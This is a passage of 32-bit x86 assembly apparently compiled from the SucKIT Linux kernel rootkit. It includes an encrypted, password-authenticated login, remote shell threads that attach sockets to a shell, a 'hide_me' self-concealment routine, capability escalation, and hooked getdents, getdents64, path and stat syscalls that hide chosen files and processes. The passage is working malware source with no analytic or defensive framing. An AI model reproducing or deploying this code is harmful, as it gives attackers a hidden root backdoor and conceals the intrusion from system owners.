	movw	33(%esp), %dx
	movw	35(%esp), %ax
	testw	%ax, %dx
	movw	$0, 22(%esp)
	movw	$0, 20(%esp)
	movw	%dx, 18(%esp)
	movw	%ax, 16(%esp)
	jne	.L228
.L216:
	pushl	%eax
	pushl	12(%esp)
	pushl	%ebp
	jmp	.L220
.L228:
	leal	16(%esp), %eax
	pushl	%eax
	pushl	$21524
	pushl	36(%esp)
	pushl	$54
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$28
	movl	20(%esp), %eax
	negl	%eax
	pushl	%eax
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L216
.L227:
	leal	32(%esp), %edx
	movl	%edi, %esi
	movl	8(%esp), %ecx
	movl	%edx, %edi
#APP
	rep; movsb
#NO_APP
	pushl	%eax
	movl	$5, %eax
	subl	12(%esp), %eax
	pushl	%eax
	movl	%edx, %edi
	addl	16(%esp), %edi
	pushl	%edi
	pushl	%ebx
	call	k_cread
	movl	$0, 24(%esp)
	addl	$16, %esp
	jmp	.L214
.L191:
	pushl	%ecx
	pushl	$1
	negl	20(%esp)
	pushl	20(%esp)
	pushl	$37
	call __do_syscall;push %eax
	pushl	$0
	pushl	$0
	pushl	$-1
	pushl	$7
	call __do_syscall;push %eax
	addl	$32, %esp
	jmp	.L186
.L225:
	leal	31(%ebx), %eax
	jmp	.L206
.L224:
	pushl	$512
	leal	180(%esp), %edi
	pushl	%edi
	pushl	%esi
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %esi
	jle	.L191
	pushl	%eax
	pushl	k_crypt_ctx
	pushl	%esi
	pushl	%edi
	call	k_rc4
	addl	$12, %esp
	pushl	%esi
	pushl	%edi
	pushl	%ebx
	call	k_hard_write
	addl	$16, %esp
	jmp	.L201
.L223:
	leal	31(%esi), %eax
	jmp	.L202
.L222:
	leal	31(%ebx), %eax
	jmp	.L196
.L221:
	leal	31(%esi), %eax
	jmp	.L194
.Lfe29:
	.size	interactive,.Lfe29-interactive
.LC12:
	.string	"-c"
	.data
	.type	darg.2,@object
	.size	darg.2,16
darg.2:
	.long	.LC8
	.long	.LC12
	.long	0
	.long	0
	.type	nonint_shell,@function
nonint_shell:
	pushl	%ebx
	subl	$16, %esp
	movl	24(%esp), %ebx
	movl	28(%esp), %eax
	pushl	(%ebx)
	pushl	$6
	movl	%eax, darg.2+8
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$0
	pushl	4(%ebx)
	pushl	$63
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$1
	pushl	4(%ebx)
	pushl	$63
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$2
	pushl	4(%ebx)
	pushl	$63
	call __do_syscall;push %eax
	movl	$.LC9, %ebx
	movl	$darg.2, %ecx
	movl	$denv, %edx
	movl	$11, %eax
#APP
	int $0x80
#NO_APP
	addl	$24, %esp
	popl	%ebx
	ret
.Lfe30:
	.size	nonint_shell,.Lfe30-nonint_shell
	.type	noninteractive,@function
noninteractive:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$1068, %esp
	movl	1088(%esp), %esi
	xorl	%ebx, %ebx
	leal	32(%esp), %ebp
.L232:
	movl	$1024, %eax
	pushl	%ecx
	subl	%ebx, %eax
	pushl	%eax
	leal	(%ebx,%ebp), %eax
	pushl	%eax
	pushl	%esi
	call	k_cread
	addl	$16, %esp
	testl	%eax, %eax
	jle	.L231
	addl	%eax, %ebx
	cmpb	$10, 31(%esp,%ebx)
	je	.L233
	cmpl	$1023, %ebx
	jbe	.L232
.L233:
	movb	$0, 31(%esp,%ebx)
	leal	8(%esp), %ebx
	pushl	%ebx
	pushl	$0
	pushl	$1
	pushl	$1
	call	socketpair
	addl	$12, %esp
	pushl	%ebp
	pushl	%ebx
	pushl	$nonint_shell
	call	kernel_thread
	movl	%eax, 20(%esp)
	popl	%eax
	popl	%edx
	pushl	20(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	leal	16(%esp), %edi
.L249:
	movl	8(%esp), %eax
	movl	%eax, 16(%esp)
	movl	%esi, 24(%esp)
	movw	$57, 28(%esp)
	movw	$57, 20(%esp)
	movw	$0, 30(%esp)
	movw	$0, 22(%esp)
	pushl	$-1
	pushl	$2
	pushl	%edi
	pushl	$168
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L249
	movw	22(%esp), %cx
	movl	%ecx, %eax
	andl	$1, %eax
	testw	%ax, %ax
	jne	.L251
	movw	30(%esp), %dx
	movl	%edx, %eax
	andl	$1, %eax
	testw	%ax, %ax
	jne	.L252
	andl	$56, %ecx
	jne	.L246
	andl	$56, %edx
	je	.L249
.L246:
	pushl	%eax
	pushl	$15
	movl	12(%esp), %ebx
	negl	%ebx
	pushl	%ebx
	pushl	$37
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$9
	pushl	%ebx
	pushl	$37
	call __do_syscall;push %eax
	pushl	$0
	pushl	$0
	pushl	$-1
	pushl	$7
	call __do_syscall;push %eax
	addl	$32, %esp
.L231:
	addl	$1068, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L252:
	pushl	%eax
	pushl	$1024
	pushl	%ebp
	pushl	%esi
	call	k_cread
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	je	.L246
	pushl	%eax
	pushl	%ebx
	pushl	%ebp
	pushl	20(%esp)
	call	k_hard_write
.L250:
	addl	$16, %esp
	jmp	.L249
.L251:
	pushl	$1024
	pushl	%ebp
	pushl	16(%esp)
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	je	.L246
	pushl	%eax
	pushl	%ebx
	pushl	%ebp
	pushl	%esi
	call	k_cwrite
	jmp	.L250
.Lfe31:
	.size	noninteractive,.Lfe31-noninteractive
.LC13:
	.string	"unsupported action type\n"
	.type	login,@function
login:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$100, %esp
	pushl	$0
	pushl	$27
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$20
	pushl	$cfg+272
	leal	60(%esp), %esi
	pushl	%esi
	call	sha1_kernel
	addl	$12, %esp
	pushl	$20
	pushl	%esi
	leal	28(%esp), %ebx
	pushl	%ebx
	call	sha1_kernel
	addl	$12, %esp
	pushl	k_crypt_ctx
	pushl	$20
	pushl	$cfg+272
	call	k_rc4_init
	addl	$12, %esp
	pushl	k_decrypt_ctx
	pushl	$20
	pushl	$cfg+272
	call	k_rc4_init
	addl	$12, %esp
	pushl	$20
	pushl	%ebx
	pushl	124(%esp)
	call	k_hard_write
	xorl	%ebp, %ebp
	addl	$16, %esp
	cmpl	$19, %eax
	jg	.L287
.L255:
	subl	$8, %esp
	pushl	120(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$108, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L287:
	pushl	%eax
	pushl	$20
	pushl	%esi
	pushl	124(%esp)
	call	k_cread
	addl	$16, %esp
	cmpl	$19, %eax
	jle	.L255
	movl	$cfg+272, %edi
	movl	$20, %ecx
	movl	%ebp, %eax
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	jne	.L255
	pushl	%eax
	pushl	$4
	leal	20(%esp), %eax
	pushl	%eax
	pushl	124(%esp)
	call	k_cread
	addl	$16, %esp
	cmpl	$3, %eax
	jle	.L255
	movl	12(%esp), %edx
	testl	%edx, %edx
	jne	.L288
.L260:
	movl	denv, %eax
	xorl	%esi, %esi
	testl	%eax, %eax
	je	.L282
	movl	$denv, %eax
.L268:
	incl	%esi
	movl	(%eax,%esi,4), %edi
	testl	%edi, %edi
	jne	.L268
.L282:
	leal	(%edx,%ebp), %eax
	cmpl	%eax, %ebp
	movl	%ebp, %ebx
	jae	.L284
	movl	%eax, %ebp
	xorl	%edx, %edx
.L274:
	movl	%ebx, denv(,%esi,4)
	movl	%edx, %ecx
	incl	%esi
	movl	%ebx, %edi
	movl	%edx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	leal	1(%ecx,%ebx), %ebx
	cmpl	%ebp, %ebx
	jb	.L274
.L284:
	movl	$0, denv(,%esi,4)
	pushl	%esi
	pushl	$1
	leal	19(%esp), %eax
	pushl	%eax
	pushl	124(%esp)
	call	k_cread
	addl	$16, %esp
	movsbl	11(%esp),%eax
	testl	%eax, %eax
	je	.L276
	decl	%eax
	je	.L277
	xorl	%ecx, %ecx
	movl	$.LC13, %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	pushl	%ebx
	pushl	%ecx
	pushl	$.LC13
	pushl	124(%esp)
	call	k_cwrite
.L286:
	addl	$16, %esp
	jmp	.L255
.L277:
	subl	$12, %esp
	pushl	124(%esp)
	call	noninteractive
	jmp	.L286
.L276:
	subl	$12, %esp
	pushl	124(%esp)
	call	interactive
	jmp	.L286
.L288:
	subl	$12, %esp
	pushl	%edx
	call	ualloc
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebp
	je	.L255
	pushl	%eax
	pushl	16(%esp)
	pushl	%ebp
	pushl	124(%esp)
	call	k_cread
	movl	28(%esp), %edx
	addl	$16, %esp
	cmpl	%edx, %eax
	je	.L289
.L263:
	subl	$12, %esp
	pushl	%ebp
	call	ufree
	jmp	.L286
.L289:
	cmpb	$0, -1(%edx,%ebp)
	je	.L260
	jmp	.L263
.Lfe32:
	.size	login,.Lfe32-login
	.type	shell_thread,@function
shell_thread:
	pushl	%esi
	pushl	%ebx
	subl	$36, %esp
	movl	48(%esp), %esi
	call	set_full_caps
	call	hide_me
	pushl	%eax
	pushl	kbase
	pushl	$0
	pushl	$91
	call __do_syscall;push %eax
	movl	$1073741824, 16(%esp)
	movl	$4096, 20(%esp)
	movl	$7, 24(%esp)
	movl	$34, 28(%esp)
	movl	$0, 32(%esp)
	movl	$0, 36(%esp)
	popl	%ecx
	popl	%ebx
	leal	8(%esp), %eax
	pushl	%eax
	pushl	$90
	call __do_syscall;push %eax
	xorl	%ebx, %ebx
	addl	$16, %esp
.L296:
	cmpl	%esi, %ebx
	je	.L293
	subl	$8, %esp
	pushl	%ebx
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
.L293:
	incl	%ebx
	cmpl	$4095, %ebx
	jle	.L296
	subl	$8, %esp
	pushl	$-1
	pushl	$69
	call __do_syscall;push %eax
	movl	%esi, (%esp)
	call	login
	addl	$12, %esp
	pushl	$4096
	pushl	$1073741824
	pushl	$91
	call __do_syscall;push %eax
	popl	%eax
	popl	%edx
	pushl	$0
	pushl	$1
	call __do_syscall;push %eax
	addl	$52, %esp
	popl	%ebx
	popl	%esi
	ret
.Lfe33:
	.size	shell_thread,.Lfe33-shell_thread
	.type	do_shell_thread,@function
do_shell_thread:
	pushl	%ebx
	subl	$16, %esp
	movl	24(%esp), %ebx
	pushl	$0
	pushl	$66
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$0
	pushl	$0
	pushl	$57
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$0
	pushl	%ebx
	pushl	$shell_thread
	call	kernel_thread
	movl	$0, 36(%esp)
	movl	$1, 32(%esp)
	addl	$24, %esp
	popl	%ebx
	jmp	__do_syscall
.Lfe34:
	.size	do_shell_thread,.Lfe34-do_shell_thread
	.type	pipe_shell,@function
pipe_shell:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$48, %esp
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	12(%eax), %ebp
	movl	$-1, 12(%eax)
	leal	16(%esp), %eax
	movl	68(%esp), %edi
	movl	72(%esp), %esi
	movl	$16, 16(%esp)
	movl	$-1, 8(%esp)
	pushl	%eax
	leal	24(%esp), %eax
	pushl	%eax
	pushl	%edi
	call	getpeername
	addl	$16, %esp
	testl	%eax, %eax
	js	.L305
	cmpw	$2, 16(%esp)
	je	.L317
.L305:
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%ebp, 12(%eax)
	movl	4(%esp), %eax
	addl	$44, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L317:
	cmpw	%si, 18(%esp)
	jne	.L305
	subl	$8, %esp
	pushl	%edi
	pushl	$41
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %esi
	js	.L305
	pushl	%eax
	pushl	$6
	pushl	$1
	pushl	$2
	call	socket
	movl	%eax, 24(%esp)
	addl	$16, %esp
	movl	8(%esp), %eax
	testl	%eax, %eax
	js	.L310
	pushl	%eax
	pushl	%edi
	pushl	16(%esp)
	pushl	$63
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L312
	subl	$8, %esp
	pushl	16(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$0
	pushl	%esi
	pushl	$do_shell_thread
	call	kernel_thread
	popl	%edi
	movl	%eax, %ebx
	popl	%eax
	pushl	%esi
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%ebx, %ebx
	jle	.L313
	pushl	$0
	pushl	$0
	pushl	%ebx
	pushl	$7
	call __do_syscall;push %eax
	addl	$16, %esp
.L313:
	movl	$-32, 4(%esp)
	pushl	%ebx
	pushl	$13
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	popl	%edx
	popl	%ecx
	pushl	%eax
	pushl	$37
	call __do_syscall;push %eax
	addl	$16, %esp
.L312:
	subl	$8, %esp
	pushl	16(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
.L310:
	subl	$8, %esp
	pushl	%esi
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L305
.Lfe35:
	.size	pipe_shell,.Lfe35-pipe_shell
.LC14:
	.string	"v2.0-devel-rc2"
	.type	new_aux,@function
new_aux:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$420, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	xorl	%ebx, %ebx
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L321
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ebx, %ebx
	testl	%eax, pidtab(,%edx,4)
	setne	%bl
.L321:
	testl	%ebx, %ebx
	je	.L319
	leal	384(%esp), %edi
	movl	$12, %ecx
	movl	432(%esp), %esi
#APP
	rep; movsb
#NO_APP
	movl	384(%esp), %eax
	cmpl	$6, %eax
	ja	.L361
	jmp	*.L341(,%eax,4)
.L341:
	.long	.L325
	.long	.L328
	.long	.L329
	.long	.L332
	.long	.L361
	.long	.L335
	.long	.L337
.L325:
	movl	$.LC14, %eax
	movl	388(%esp), %edi
	movl	$15, %ecx
	movl	%eax, %esi
.L360:
#APP
	rep; movsb
#NO_APP
.L361:
	movl	$804183022, %eax
.L318:
	addl	$412, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L328:
	call	suckit_uninstall
	jmp	.L361
.L329:
	movl	388(%esp), %edx
	cmpl	$32767, %edx
	ja	.L361
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$-2, %eax
	roll	%cl, %eax
	shrl	$5, %edx
	andl	%eax, pidtab(,%edx,4)
	jmp	.L361
.L332:
	movl	388(%esp), %edx
	cmpl	$32767, %edx
	ja	.L361
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	orl	%eax, pidtab(,%edx,4)
	jmp	.L361
.L335:
	xorl	%ecx, %ecx
	movl	$cfg+256, %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	pushl	%eax
	pushl	$20
	pushl	$cfg+272
	pushl	$lkey
	movl	%ecx, hlen
	call	sha1_kernel
	addl	$16, %esp
	jmp	.L361
.L337:
	movl	$cfg, %ebx
	xorl	%ecx, %ecx
	movl	388(%esp), %edx
	movl	%ebx, %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	incl	%ecx
	movl	%ebx, %esi
	movl	%edx, %edi
	jmp	.L360
.L319:
	cmpl	$4, 436(%esp)
	je	.L362
.L345:
	pushl	444(%esp)
	pushl	444(%esp)
	pushl	444(%esp)
	pushl	$59
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L318
.L362:
	movl	$20, %ebp
	movl	%ebp, %ecx
	movl	$cfg+272, %esi
	leal	352(%esp), %edi
#APP
	rep; movsb
#NO_APP
	movl	440(%esp), %edi
	cmpl	%edi, 352(%esp)
	jne	.L345
	movl	444(%esp), %eax
	cmpl	%eax, 356(%esp)
	jne	.L345
	leal	384(%esp), %edi
	movl	$12, %ecx
	movl	432(%esp), %esi
#APP
	rep; movsb
#NO_APP
	movl	388(%esp), %edx
	movl	%ebx, %ecx
	movl	%edx, %edi
	movl	%ebx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	cmpl	$256, %ecx
	movl	%ecx, 32(%esp)
	jb	.L353
	movl	$255, 32(%esp)
.L353:
	movl	32(%esp), %ecx
	movl	%edx, %esi
	leal	64(%esp), %edi
#APP
	rep; movsb
#NO_APP
	movl	32(%esp), %edi
	movb	$0, 64(%esp,%edi)
	movl	%ebx, %ecx
	leal	64(%esp), %edi
	movl	%ebx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	pushl	%eax
	pushl	%ecx
	leal	72(%esp), %eax
	pushl	%eax
	leal	332(%esp), %ecx
	pushl	%ecx
	call	sha1_kernel
	addl	$16, %esp
	movl	%ebx, %eax
	leal	320(%esp), %esi
	leal	352(%esp), %edi
	movl	%ebp, %ecx
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	jne	.L345
	call	hide_me
	jmp	.L361
.Lfe36:
	.size	new_aux,.Lfe36-new_aux
	.type	should_strip_name,@function
should_strip_name:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$8, %esp
	xorl	%ecx, %ecx
	movl	28(%esp), %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	movl	hlen, %edx
	xorl	%ebx, %ebx
	cmpl	%edx, %ecx
	jl	.L365
	movl	28(%esp), %esi
	addl	%ecx, %esi
	movl	$cfg+256, %ebp
	subl	%edx, %esi
	leal	1(%edx), %ecx
	movl	%ebx, %eax
	movl	%ebp, %edi
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	jne	.L365
	movl	$1, %ebx
.L365:
	addl	$8, %esp
	movl	%ebx, %eax
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe37:
	.size	should_strip_name,.Lfe37-should_strip_name
	.type	should_strip,@function
should_strip:
	pushl	%ebx
	subl	$20, %esp
	pushl	28(%esp)
	call	should_strip_name
	xorl	%ebx, %ebx
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L369
	movl	20(%esp), %edx
	subl	$2, %edx
	testw	%dx, %dx
	jne	.L368
	movl	%edx, %ecx
	shrl	$16, %ecx
	xorl	%eax, %eax
	cmpl	$32767, %ecx
	ja	.L371
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$21, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L371:
	testl	%eax, %eax
	je	.L368
.L369:
	movl	$1, %ebx
.L368:
	addl	$8, %esp
	movl	%ebx, %eax
	popl	%ebx
	ret
.Lfe38:
	.size	should_strip,.Lfe38-should_strip
	.type	check_path,@function
check_path:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$1120, %esp
	movl	1140(%esp), %esi
	pushl	$0
	pushl	%esi
	pushl	$33
	call __do_syscall;push %eax
	movl	%eax, 28(%esp)
	addl	$16, %esp
	movl	12(%esp), %ecx
	xorl	%eax, %eax
	testl	%ecx, %ecx
	js	.L372
	leal	80(%esp), %ebx
	movl	%esi, %edx
	movl	$1023, %ecx
.L374:
	decl	%ecx
	cmpl	$-1, %ecx
	je	.L375
	movb	(%edx), %al
	movb	%al, (%ebx)
	incl	%edx
	incl	%ebx
	testb	%al, %al
	jne	.L374
.L375:
	xorl	%ecx, %ecx
	movb	$0, 1103(%esp)
	leal	80(%esp), %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	12(%eax), %edx
	movl	%ecx, %ebx
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$-1, 12(%eax)
	movl	$cfg+256, %ebp
.L398:
	testl	%ebx, %ebx
	jle	.L384
	movl	hlen, %eax
	cmpl	%eax, %ebx
	jl	.L389
	leal	80(%esp), %esi
	addl	%ebx, %esi
	subl	%eax, %esi
	leal	1(%eax), %ecx
	movl	%ebp, %edi
	xorl	%eax, %eax
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	je	.L388
.L389:
	pushl	%edx
	leal	20(%esp), %eax
	pushl	%eax
	leal	88(%esp), %eax
	pushl	%eax
	pushl	$107
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L387
	movl	20(%esp), %edx
	subl	$2, %edx
	testw	%dx, %dx
	jne	.L387
	movl	%edx, %ecx
	shrl	$16, %ecx
	xorl	%eax, %eax
	cmpl	$32767, %ecx
	ja	.L392
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$21, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L392:
	testl	%eax, %eax
	jne	.L388
.L387:
	testl	%ebx, %ebx
	je	.L398
.L397:
	cmpb	$47, 80(%esp,%ebx)
	je	.L402
	decl	%ebx
	jne	.L397
	jmp	.L398
.L402:
	movb	$0, 80(%esp,%ebx)
	jmp	.L398
.L388:
	movl	$1, 12(%esp)
.L384:
	movl	$-8192, %eax
	movl	8(%esp), %edx
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%edx, 12(%eax)
	movl	12(%esp), %eax
.L372:
	addl	$1116, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe39:
	.size	check_path,.Lfe39-check_path
.globl new_getdents
	.type	new_getdents,@function
new_getdents:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L406
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L406:
	testl	%eax, %eax
	je	.L407
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	$141
	call __do_syscall;push %eax
	addl	$16, %esp
.L403:
	addl	$12, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L407:
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	$141
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jle	.L403
	movl	36(%esp), %ebx
	movl	%eax, %ebp
.L418:
	movzwl	8(%ebx), %eax
	movl	%eax, 8(%esp)
	movl	8(%esp), %eax
	subl	$8, %esp
	pushl	(%ebx)
	subl	%eax, %ebp
	leal	10(%ebx), %eax
	pushl	%eax
	call	should_strip
	addl	$16, %esp
	testl	%eax, %eax
	je	.L415
	movzwl	8(%ebx), %esi
	leal	(%esi,%ebx), %esi
	movl	%ebp, %ecx
	movl	%ebx, %edi
#APP
	rep; movsb
#NO_APP
.L411:
	testl	%ebp, %ebp
	jg	.L418
	movl	%ebx, %eax
	subl	36(%esp), %eax
	je	.L407
	jmp	.L403
.L415:
	movl	8(%esp), %eax
	addl	%eax, %ebx
	jmp	.L411
.Lfe40:
	.size	new_getdents,.Lfe40-new_getdents
.globl new_getdents64
	.type	new_getdents64,@function
new_getdents64:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L426
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L426:
	testl	%eax, %eax
	je	.L427
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	$220
	call __do_syscall;push %eax
	addl	$16, %esp
.L423:
	addl	$12, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L427:
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	40(%esp)
	pushl	$220
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jle	.L423
	movl	36(%esp), %ebx
	movl	%eax, %ebp
.L438:
	movzwl	16(%ebx), %eax
	movl	%eax, 8(%esp)
	movl	8(%esp), %eax
	subl	$8, %esp
	pushl	(%ebx)
	subl	%eax, %ebp
	leal	19(%ebx), %eax
	pushl	%eax
	call	should_strip
	addl	$16, %esp
	testl	%eax, %eax
	je	.L435
	movzwl	16(%ebx), %esi
	leal	(%esi,%ebx), %esi
	movl	%ebp, %ecx
	movl	%ebx, %edi
#APP
	rep; movsb
#NO_APP
.L431:
	testl	%ebp, %ebp
	jg	.L438
	movl	%ebx, %eax
	subl	36(%esp), %eax
	je	.L427
	jmp	.L423
.L435:
	movl	8(%esp), %eax
	addl	%eax, %ebx
	jmp	.L431
.Lfe41:
	.size	new_getdents64,.Lfe41-new_getdents64
	.type	new_pathf,@function
new_pathf:
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L446
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ecx, %ecx
	testl	%eax, pidtab(,%edx,4)
	setne	%cl
.L446:
	testl	%ecx, %ecx
	movl	$-200, %eax
	je	.L448
.L443:
	addl	$12, %esp
	ret
.L448:
	subl	$12, %esp
	pushl	28(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	setne	%al
	movzbl	%al, %eax
	decl	%eax
	andl	$-198, %eax
	subl	$2, %eax
	jmp	.L443
.Lfe42:
	.size	new_pathf,.Lfe42-new_pathf
	.type	new_oldnewf,@function
new_oldnewf:
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L452
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L452:
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L455
.L449:
	movl	%edx, %eax
	addl	$12, %esp
	ret
.L455:
	subl	$12, %esp
	pushl	28(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	je	.L456
.L454:
	movl	$-2, %edx
	jmp	.L449
.L456:
	subl	$12, %esp
	pushl	32(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L449
	jmp	.L454
.Lfe43:
	.size	new_oldnewf,.Lfe43-new_oldnewf
	.type	do_stat,@function
do_stat:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$20, %esp
	movl	40(%esp), %edi
	movl	4(%edi), %eax
	movl	%eax, 16(%esp)
	movl	(%edi), %ebx
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ecx, %ecx
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L460
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	xorl	%ecx, %ecx
	testl	%eax, pidtab(,%edx,4)
	setne	%cl
.L460:
	testl	%ecx, %ecx
	movl	$-200, %eax
	je	.L471
.L457:
	addl	$12, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L471:
	subl	$12, %esp
	pushl	%ebx
	call	check_path
	movl	%eax, %esi
	addl	$16, %esp
	testl	%esi, %esi
	movl	$-2, %eax
	jne	.L457
	pushl	%ebp
	pushl	12(%esp)
	pushl	%ebx
	pushl	36(%edi)
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L457
